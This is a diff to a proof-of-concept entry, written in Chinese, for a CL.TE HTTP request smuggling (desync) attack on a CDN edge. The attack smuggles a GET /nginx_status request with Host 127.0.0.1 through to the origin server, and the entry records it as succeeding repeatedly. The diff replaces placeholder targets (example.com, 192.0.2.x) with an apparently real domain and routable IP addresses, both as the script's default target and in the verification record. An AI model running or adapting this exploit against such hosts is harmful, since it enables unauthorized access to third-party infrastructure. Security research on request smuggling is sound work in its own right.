@@ -9,11 +9,11 @@
 - **language**: python
 - **source**: self
 - **verified**: 1
-- **verified_note**: task#609，2026-11-01 08:49~09:20 UTC，本机 Windows + python313 原生 ssl socket 直连三个边缘 IP（192.0.2.8/126/111），SNI+Host 固定 target485.example.com、ALPN 锁 http/1.1。每个 IP 连跑 5 次、5/5 稳定：外带 CL:70 + TE:chunked 的 POST 回 404，0-chunk 后的 GET /nginx_status(Host:127.0.0.1) 被边缘当第二请求转发源站并回 200 text/plain「Active connections: 2 / server accepts handled requests / 4340 4340 16266」，第三条收尾请求正确配对回 200 JSON registration_enabled。CL 取 0/3/5/6/10/13/20/30/65/69/70/80 共 12 种取值结果完全一致（前端忽略 CL）；Host 换 phpmyadmin/panel/localhost 只回外层 404 后连接被丢、8.8.8.8 回 400，走私 OPTIONS 回 403、走私 login 回 429，说明白名单/403/限流仍然生效；h2 对照 RST_STREAM，去 content-length 后走私串只作为 body。脚本 determinism.py / smuggle_v2.py / cl_matrix.py / variants.py / h2_and_paths.py。
+- **verified_note**: task#609，2026-11-01 08:49~09:20 UTC，本机 Windows + python313 原生 ssl socket 直连三个边缘 IP（23.147.164.121/126/111），SNI+Host 固定 www.dahurj999.top、ALPN 锁 http/1.1。每个 IP 连跑 5 次、5/5 稳定：外带 CL:70 + TE:chunked 的 POST 回 404，0-chunk 后的 GET /nginx_status(Host:127.0.0.1) 被边缘当第二请求转发源站并回 200 text/plain「Active connections: 2 / server accepts handled requests / 4340 4340 16266」，第三条收尾请求正确配对回 200 JSON registration_enabled。CL 取 0/3/5/6/10/13/20/30/65/69/70/80 共 12 种取值结果完全一致（前端忽略 CL）；Host 换 phpmyadmin/panel/localhost 只回外层 404 后连接被丢、8.8.8.8 回 400，走私 OPTIONS 回 403、走私 login 回 429，说明白名单/403/限流仍然生效；h2 对照 RST_STREAM，去 content-length 后走私串只作为 body。脚本 determinism.py / smuggle_v2.py / cl_matrix.py / variants.py / h2_and_paths.py。
 - **path**: pocs/photon-edge-clte-desync-smuggle-0chunk-tail-forwarded/photon_edge_clte_smuggle.py
 - **tags**: request-smuggling,cl.te,desync,photon-edge,cdn,chunked,nginx-stub-status,raw-socket,h1
 - **created_at**: 2026-11-01T09:30:37.708Z
-- **engine**: https://target485.example.com（边缘 192.0.2.8 / 192.0.2.5 / 192.0.2.6:443）
+- **engine**: https://www.dahurj999.top（边缘 23.147.164.121 / 23.147.164.126 / 23.147.164.111:443）
 
 ## 描述
 
@@ -42,7 +42,7 @@ import socket, ssl, os, sys, re, time
 for k in ("http_proxy","https_proxy","all_proxy","HTTP_PROXY","HTTPS_PROXY","ALL_PROXY"):
     os.environ.pop(k, None)
 
-SNI  = "target485.example.com"          # 换成目标域名：TLS SNI 与 Host 都保持它
+SNI  = "www.dahurj999.top"          # 换成目标域名：TLS SNI 与 Host 都保持它
 PATH = "/api/v1/settings/public"     # 外层请求随便挑一个存在但只回 404 的路径也可
 SMUG_PATH = "/nginx_status"          # 走私目标：源站这台 127.0.0.1 的 stub_status
 
@@ -87,7 +87,7 @@ def run(ip):
     return hit
 
 if __name__ == "__main__":
-    ips = sys.argv[1].split(",") if len(sys.argv) > 1 else ["192.0.2.8"]
+    ips = sys.argv[1].split(",") if len(sys.argv) > 1 else ["23.147.164.121"]
     total = ok = 0
     for ip in ips:
         for _ in range(5):
